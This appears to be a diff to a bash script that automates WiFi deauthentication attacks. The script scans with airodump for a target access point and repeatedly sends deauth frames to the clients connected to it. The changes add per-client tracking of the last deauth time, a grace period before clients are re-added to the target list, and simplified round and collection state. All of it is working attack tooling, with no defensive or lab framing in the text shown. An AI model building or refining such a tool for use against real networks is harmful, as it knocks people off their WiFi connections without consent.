@@ -61,6 +61,7 @@ CH_DEAUTH_COUNT_FILE=""
 STATUS_FILE=""
 CLIENTS_FILE=""
 CLIENTS_PENDING_FILE=""
+CLIENT_LAST_DEAUTH_FILE=""
 
 SCAN_TIMEOUT="${SCAN_TIMEOUT:-20}"          # seconds (full scan)
 QUICK_CONFIRM="${QUICK_CONFIRM:-5}"         # seconds (if we have a channel hint)
@@ -68,6 +69,7 @@ SLEEP_BETWEEN="${SLEEP_BETWEEN:-0.5}"
 CLIENT_ROUND_SECS="${CLIENT_ROUND_SECS:-10}"
 CLIENT_CMD_TIMEOUT="${CLIENT_CMD_TIMEOUT:-10}"
 CLIENT_DEAUTH_COUNT="${CLIENT_DEAUTH_COUNT:-5}"
+CLIENT_READD_GRACE_SECS="${CLIENT_READD_GRACE_SECS:-0}"
 
 # PIDs / PGIDs
 DEAUTH_PGID=""
@@ -99,7 +101,6 @@ START_TS="$(date +%s)"
 ENABLE_ERROR_LOG=0
 ROUND_ACTIVE=0
 COLLECTING=0
-NEED_QC_AFTER_ROUND=1
 ROUND_NEXT_TS=0
 
 # ----------------------------- Helpers ----------------------------
@@ -370,7 +371,25 @@ merge_clients_from_csv() {
   [[ -z "$target" ]] && return 0
   [[ -z "$bssid" || ! -f "$csv" ]] && return 0
   local tmp="${target}.tmp"
-  { cat "$target" 2>/dev/null || true; parse_csv_for_clients "$csv" "$bssid"; } | sort -u > "$tmp"
+  : > "$tmp"
+  if [[ -f "$target" ]]; then
+    cat "$target" >> "$tmp"
+  fi
+  if (( CLIENT_READD_GRACE_SECS > 0 )) && [[ -n "${CLIENT_LAST_DEAUTH_FILE:-}" && -f "$CLIENT_LAST_DEAUTH_FILE" ]]; then
+    local now; now="$(date +%s)"
+    parse_csv_for_clients "$csv" "$bssid" | awk -v now="$now" -v grace="$CLIENT_READD_GRACE_SECS" -v last="$CLIENT_LAST_DEAUTH_FILE" '
+      BEGIN { while ((getline < last) > 0) { if ($1 != "") last_ts[$1] = $2 } }
+      {
+        c = $1
+        if (c == "") next
+        t = last_ts[c]
+        if (t == "" || (now - t) >= grace) print c
+      }
+    ' >> "$tmp"
+  else
+    parse_csv_for_clients "$csv" "$bssid" >> "$tmp"
+  fi
+  sort -u "$tmp" -o "$tmp"
   mv -f "$tmp" "$target"
 }
 
@@ -491,9 +510,21 @@ start_client_round() {
   # shellcheck disable=SC2016
   setsid bash -c '
     set -euo pipefail
-    ifc="$1"; bssid="$2"; clients_file="$3"; deauth_count="$4"; cmd_timeout="$5"
+    ifc="$1"; bssid="$2"; clients_file="$3"; deauth_count="$4"; cmd_timeout="$5"; last_file="$6"
 
     log() { printf "[CLIENT] %s\n" "$*"; }
+
+    update_last_deauth() {
+      local client="$1" ts="$2" tmp
+      [[ -z "$last_file" ]] && return 0
+      tmp="${last_file}.tmp"
+      if [[ -f "$last_file" ]]; then
+        awk -v c="$client" -v t="$ts" "BEGIN { found=0 } \$1 == c { print c, t; found=1; next } { print } END { if (!found) print c, t }" "$last_file" > "$tmp"
+      else
+        printf "%s %s\n" "$client" "$ts" > "$tmp"
+      fi
+      mv -f "$tmp" "$last_file"
+    }
 
     run_client_once() {
       local client="$1" ifc="$2" bssid="$3" count="$4" timeout_s="$5"
@@ -516,6 +547,8 @@ start_client_round() {
       kill -INT  "$killer" 2>/dev/null || true
       kill -TERM "$killer" 2>/dev/null || true
       kill -KILL "$killer" 2>/dev/null || true
+      ts="$(date +%s)"
+      update_last_deauth "$client" "$ts"
       log "Deauth end: ${client}"
     }
 
@@ -536,7 +569,7 @@ start_client_round() {
     if (( ${#clients[@]} > 0 )); then
       log "Round end"
     fi
-  ' -- "$ifc" "$bssid" "$CLIENTS_FILE" "$CLIENT_DEAUTH_COUNT" "$CLIENT_CMD_TIMEOUT" &
+  ' -- "$ifc" "$bssid" "$CLIENTS_FILE" "$CLIENT_DEAUTH_COUNT" "$CLIENT_CMD_TIMEOUT" "$CLIENT_LAST_DEAUTH_FILE" &
   CLIENT_LOOP_PID="$!"
   local realpg; realpg="$(get_pgid "$CLIENT_LOOP_PID")"
   CLIENT_LOOP_PGID="-$CLIENT_LOOP_PID"; [[ -n "$realpg" ]] && CLIENT_LOOP_PGID="-$realpg"
@@ -558,7 +591,6 @@ stop_deauth() {
   fi
   ROUND_ACTIVE=0
   COLLECTING=0
-  NEED_QC_AFTER_ROUND=1
   ROUND_NEXT_TS=0
 }
 
@@ -615,6 +647,8 @@ start_deauth() {
 
   CURRENT_CH="$ch"
   CURRENT_BSSID="$bssid"
+  ROUND_ACTIVE=0
+  COLLECTING=1
   echo "[*] Deauth started on ch $CURRENT_CH for $CURRENT_BSSID"
   write_status
 }
@@ -666,10 +700,12 @@ CH_DEAUTH_COUNT_FILE="${INSTANCE_DIR}/deauth.ch"
 STATUS_FILE="${INSTANCE_DIR}/status.env"
 CLIENTS_FILE="${INSTANCE_DIR}/clients.list"
 CLIENTS_PENDING_FILE="${INSTANCE_DIR}/clients.pending"
+CLIENT_LAST_DEAUTH_FILE="${INSTANCE_DIR}/clients.last_deauth"
 echo 0 > "$TOT_DEAUTH_COUNT_FILE"
 echo 0 > "$CH_DEAUTH_COUNT_FILE"
 : > "$CLIENTS_FILE"
 : > "$CLIENTS_PENDING_FILE"
+: > "$CLIENT_LAST_DEAUTH_FILE"
 write_status
 
 echo "[INIT] Instance dir: $INSTANCE_DIR"
@@ -700,18 +736,19 @@ while true; do
     if [[ -z "$CLIENT_LOOP_PID" ]] || ! kill -0 "$CLIENT_LOOP_PID" 2>/dev/null; then
       CLIENT_LOOP_PID=""; CLIENT_LOOP_PGID=""
       ROUND_ACTIVE=0
-      NEED_QC_AFTER_ROUND=1
-      COLLECTING=0
+      if [[ -n "$DEAUTH_PGID" ]]; then
+        COLLECTING=1
+      else
+        COLLECTING=0
+      fi
     fi
   fi
 
   FOUND_MODE=""
   RES_LINE=""
-  did_quick_confirm=0
 
   # Quick confirm if we have a hint
   if [[ -n "${KNOWN_CH:-}" || -n "${CURRENT_CH:-}" ]]; then
-    did_quick_confirm=1
     local_ch="${KNOWN_CH:-$CURRENT_CH}"
     echo "[SCAN] Quick confirm on ch $local_ch..."
     RES_LINE="$(run_airodump_until_found "$INTERFACE" "$KNOWN_BSSID" "$TARGET_SSID" "$QUICK_CONFIRM" "$local_ch")"
@@ -720,13 +757,6 @@ while true; do
       IGNORED)   FOUND_MODE="IGNORED" ;;
       TIMEOUT)   FOUND_MODE="TIMEOUT" ;;
     esac
-  fi
-
-  if (( did_quick_confirm == 1 && NEED_QC_AFTER_ROUND == 1 && ROUND_ACTIVE == 0 )); then
-    NEED_QC_AFTER_ROUND=0
-    if (( ROUND_NEXT_TS == 0 || now < ROUND_NEXT_TS )); then
-      COLLECTING=1
-    fi
   fi
 
   # Full scan otherwise
@@ -800,7 +830,7 @@ while true; do
 
   now="$(date +%s)"
   if (( ROUND_ACTIVE == 0 )) && [[ -n "$DEAUTH_PGID" ]] && (( ROUND_NEXT_TS > 0 )) && (( now >= ROUND_NEXT_TS )); then
-    if (( NEED_QC_AFTER_ROUND == 0 )) && [[ -n "$KNOWN_BSSID" ]]; then
+    if [[ -n "$KNOWN_BSSID" ]]; then
       activate_pending_clients
       clear_pending_clients
       COLLECTING=0
